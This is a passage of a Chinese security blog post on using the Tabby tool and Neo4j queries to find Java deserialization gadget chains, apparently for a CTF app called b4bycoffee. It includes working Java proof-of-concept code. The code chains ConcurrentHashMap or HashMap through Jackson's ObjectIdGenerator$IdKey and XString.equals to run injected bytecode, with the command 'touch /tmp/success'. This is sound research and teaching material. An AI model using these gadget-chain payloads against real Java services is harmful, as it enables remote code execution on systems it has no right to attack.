+<h5 id="Case3-ConcurrentHashMap-HashMap-ObjectIdGenerator-IdKey-equals-XString-equals-toString"><a href="#Case3-ConcurrentHashMap-HashMap-ObjectIdGenerator-IdKey-equals-XString-equals-toString" class="headerlink" title="Case3 (ConcurrentHashMap &#x2F; HashMap -&gt; ObjectIdGenerator$IdKey.equals -&gt; XString.equals -&gt; .toString)"></a>Case3 (ConcurrentHashMap &#x2F; HashMap -&gt; ObjectIdGenerator$IdKey.equals -&gt; XString.equals -&gt; .toString)</h5><blockquote>
+<p>测试的时候发现可以关闭Neo4j设置中的 “Connect result nodes”，这样查询结果就只会显示调用路径，而不会显示多余的关系边</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks,6, false, false) yield path</span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;com.sun.xml.internal.ws.api.BindingID.equals&quot;,&quot;org.yaml.snakeyaml.events.Event.equals&quot;,&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals&quot;,&quot;org.springframework.cache.interceptor.CacheOperation.equals&quot;,&quot;javax.swing.text.html.HTML$UnknownTag.equals&quot;,&quot;com.rometools.rome.feed.impl.EqualsBean.hashCode&quot;,&quot;java.awt.Window.setGraphicsConfiguration&quot;,&quot;java.awt.KeyboardFocusManager.setMostRecentFocusOwner&quot;,&quot;org.apache.logging.log4j.spi.AbstractLogger.readObject&quot;,&quot;javax.swing.JTree.unarchiveExpandedState&quot;,&quot;javax.swing.tree.TreeSelectionModel.addTreeSelectionListener&quot;,&quot;javax.swing.tree.TreeModel.addTreeModelListener&quot;,&quot;java.lang.Throwable.initCause&quot;,&quot;javax.swing.event.EventListenerList.add&quot;,&quot;java.security.Provider.putId&quot;,&quot;java.util.EnumMap.typeCheck&quot;,&quot;java.awt.datatransfer.DataFlavor.readExternal&quot;]</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    n.CLASSNAME in [&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase&quot;,&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.rometools.rome.feed.impl.ObjectBean&quot;,&quot;com.rometools.rome.feed.impl.ToStringBean&quot;,&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;]</span><br><span class="line">)and none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;javax.swing.JTree.readObject&quot;,&quot;java.text.SimpleDateFormat.readObject&quot;,&quot;org.springframework.util.MimeType.readObject&quot;,&quot;org.apache.logging.log4j.message.ObjectMessage.equals&quot;,&quot;javax.naming.directory.BasicAttributes.equals&quot;]</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>
+
+<p>找到和case1很像的一条调用链路：</p>
+<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230528111243845.png" alt="image-20230528111243845"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">com.example.b4bycoffee.model.CoffeeBean#toString()</span><br><span class="line">java.lang.Object#toString()</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString#equals(java.lang.Object)</span><br><span class="line">java.lang.Object#equals(java.lang.Object)</span><br><span class="line">com.fasterxml.jackson.annotation.ObjectIdGenerator$IdKey#equals(java.lang.Object)</span><br><span class="line">java.lang.Object#equals(java.lang.Object)</span><br><span class="line">java.util.concurrent.ConcurrentHashMap#readObject(java.io.ObjectInputStream)</span><br></pre></td></tr></table></figure>
+
+<p>在case1中，是通过在<code>HashMap.putVal</code>和<code>XString.equals</code>之间插入<code>HotSwappableTargetSource</code>来解决key的hash不同的问题。</p>
+<p>同样在<code>ConcurrentHashMap.readObject</code>中也存在对比key的hash值的问题，只有当key的hash相同，才会执行<code>k.equals(qk)</code>：</p>
+<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230528112234995.png" alt="image-20230528112234995"></p>
+<p>再来看<code>com.fasterxml.jackson.annotation.ObjectIdGenerator$IdKey</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">IdKey</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">		...</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> hashCode;</span><br><span class="line">		...</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.hashCode;</span><br><span class="line">    &#125;</span><br><span class="line">  	...</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o.getClass() != <span class="built_in">this</span>.getClass()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">IdKey</span> <span class="variable">other</span> <span class="operator">=</span> (IdKey)o;</span><br><span class="line">            <span class="keyword">return</span> other.key.equals(<span class="built_in">this</span>.key) &amp;&amp; other.type == <span class="built_in">this</span>.type &amp;&amp; other.scope == <span class="built_in">this</span>.scope;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它实现了hashCode方法，而且hash值是我们直接可控的，并且equals方法中也是用的我们可控的两个key，所以<code>ObjectIdGenerator$IdKey</code>完全可以用于代替<code>HotSwappableTargetSource</code></p>
+<p>POC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeBean</span>();</span><br><span class="line">Tool.setFieldValue(coffeeBean, <span class="string">&quot;ClassByte&quot;</span>, Tool.getCMDByteCodes(<span class="string">&quot;touch /tmp/success&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">ObjectIdGenerator.<span class="type">IdKey</span> <span class="variable">idKey1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectIdGenerator</span>.IdKey(Object.class,Object.class,xString);</span><br><span class="line">ObjectIdGenerator.<span class="type">IdKey</span> <span class="variable">idKey2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectIdGenerator</span>.IdKey(Object.class,Object.class,coffeeBean);</span><br><span class="line">Tool.setFieldValue(idKey1,<span class="string">&quot;hashCode&quot;</span>,<span class="number">0</span>);</span><br><span class="line">Tool.setFieldValue(idKey2,<span class="string">&quot;hashCode&quot;</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">ConcurrentHashMap&lt;Object, Object&gt; concurrentHashMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">concurrentHashMap.put(idKey2, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">concurrentHashMap.put(idKey1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tool.encodeBase64(Tool.serialize(concurrentHashMap));</span><br></pre></td></tr></table></figure>
+
+<p>调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">toString(), CoffeeBean (com.example.b4bycoffee.model)</span><br><span class="line">equals(Object), XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals(Object), ObjectIdGenerator$IdKey (com.fasterxml.jackson.annotation)</span><br><span class="line">readObject(ObjectInputStream), ConcurrentHashMap (java.util.concurrent)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当然也可以把ConcurrentHashMap换成hashMap：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeBean</span>();</span><br><span class="line">Tool.setFieldValue(coffeeBean, <span class="string">&quot;ClassByte&quot;</span>, Tool.getCMDByteCodes(<span class="string">&quot;touch /tmp/success&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">ObjectIdGenerator.<span class="type">IdKey</span> <span class="variable">idKey1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectIdGenerator</span>.IdKey(Object.class,Object.class,xString);</span><br><span class="line">ObjectIdGenerator.<span class="type">IdKey</span> <span class="variable">idKey2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectIdGenerator</span>.IdKey(Object.class,Object.class,coffeeBean);</span><br><span class="line">Tool.setFieldValue(idKey1,<span class="string">&quot;hashCode&quot;</span>,<span class="number">0</span>);</span><br><span class="line">Tool.setFieldValue(idKey2,<span class="string">&quot;hashCode&quot;</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">hashMap.put(idKey1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">hashMap.put(idKey2, <span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tool.encodeBase64(Tool.serialize(hashMap));</span><br></pre></td></tr></table></figure>
+
+<p>调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">toString(), CoffeeBean (com.example.b4bycoffee.model)</span><br><span class="line">equals(Object), XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals(Object), ObjectIdGenerator$IdKey (com.fasterxml.jackson.annotation)</span><br><span class="line">putVal(int, Object, Object, boolean, boolean), HashMap (java.util)</span><br><span class="line">readObject(ObjectInputStream), HashMap (java.util)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/2041/">基于代码属性图的自动化漏洞挖掘实践</a></p>
+<p><a target="_blank" rel="noopener" href="https://yml-sec.top/2022/11/30/tabby%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/">tabby在CTF中的运用</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="tag"># Java反序列化漏洞</a>
+              <a href="/tags/Tabby/" rel="tag"># Tabby</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/05/05/Apache-Jena-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2023-22665/" rel="prev" title="Apache Jena 代码执行漏洞(CVE-2023-22665)">
+                  <i class="fa fa-angle-left"></i> Apache Jena 代码执行漏洞(CVE-2023-22665)
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="Nacos Raft Hessian反序列化漏洞分析">
+                  Nacos Raft Hessian反序列化漏洞分析 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">淚笑</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
